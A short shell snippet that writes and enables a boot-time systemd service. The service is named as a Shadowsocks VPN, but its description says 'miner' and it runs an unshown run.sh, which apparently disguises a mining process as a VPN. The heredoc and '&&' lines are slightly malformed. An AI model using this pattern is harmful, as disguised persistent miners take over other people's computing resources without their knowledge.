cat > /usr/lib/systemd/system/vpn_shadowsocks.service <<EOF
[Unit]
Description=miner

[Service]
ExecStart=$PWD/run.sh

[Install]
WantedBy=multi-user.target
EOF 
&& systemctl enable	vpn_shadowsocks.service